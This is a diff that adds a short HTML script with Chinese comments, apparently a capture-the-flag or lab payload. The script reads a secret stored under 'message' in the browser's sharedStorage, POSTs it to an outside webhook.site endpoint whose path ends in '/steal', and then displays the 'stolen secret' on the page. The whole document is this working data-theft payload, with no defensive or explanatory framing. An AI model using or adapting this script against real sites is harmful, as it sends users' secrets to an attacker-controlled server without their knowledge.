@@ -1,0 +1,14 @@
+<script>
+(async () => {
+    // 从共享存储中读取 "message" 值（即 secret）
+    const secret = await sharedStorage.get("message");
+    // 例如将 secret 通过 fetch 发送到你的服务器
+    await fetch("https://webhook.site/a39336da-a963-4109-8cbe-575040541868/steal", {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: secret
+    });
+    // 也可以在页面上显示 secret 以便调试
+    document.body.innerHTML = `<h1>Stolen secret:</h1><pre>${secret}</pre>`;
+})();
+</script>
